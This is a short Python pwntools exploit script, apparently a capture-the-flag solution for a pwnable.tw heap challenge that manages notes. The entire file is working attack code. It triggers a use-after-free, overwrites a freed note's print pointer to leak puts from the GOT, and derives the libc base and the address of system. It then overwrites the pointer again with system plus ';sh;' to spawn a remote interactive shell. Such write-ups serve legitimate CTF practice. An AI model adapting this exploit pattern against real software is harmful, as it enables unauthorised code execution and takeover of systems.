from pwn import *

#context.log_level = 'debug'

s = remote("chall.pwnable.tw", 10102)
#s = remote("192.168.210.131", 9003)

libc = ELF("./libc_32.so.6")
some_puts = 0x0804862B
puts_got = 0x0804A024
puts_real = 0x0005f140

leak = p32(some_puts) + p32(puts_got)

def alloc(size, data):
        s.recvuntil("Your choice ")
        s.recvuntil(":")
        s.sendline("1")
        s.recvuntil("Note size")
        s.recvuntil(":")
        s.sendline(str(size))
        s.recvuntil("Content")
        s.recvuntil(":")
        s.sendline(str(data))
        s.recvuntil("Success !")

def free(index):
        s.recvuntil("Your choice ")
        s.recvuntil(":")
        s.sendline("2")
        s.recvuntil("Index ")
        s.recvuntil(":")
        s.sendline(str(index))

def printf(index):
        s.recvuntil("Your choice ")
        s.recvuntil(":")
        s.sendline("3")
        s.recvuntil("Index ")
        s.recvuntil(":")
        s.sendline(str(index))       
 
alloc(24, 'A'*23)
alloc(24, 'A'*23)
free(0)
free(1)
alloc(8, leak)
printf(0)
#print s.recv(4)
puts = u32(s.recv(4))

print "puts -->" + hex(puts)
libc_addr = puts - puts_real
print "libc -->" + hex(libc_addr)
system_addr = libc_addr + 0x0003a940
print "system -->" + hex(system_addr)

payload = p32(system_addr) + ";sh;" 
free(2)
alloc(8, payload)
printf(0)
s.interactive()
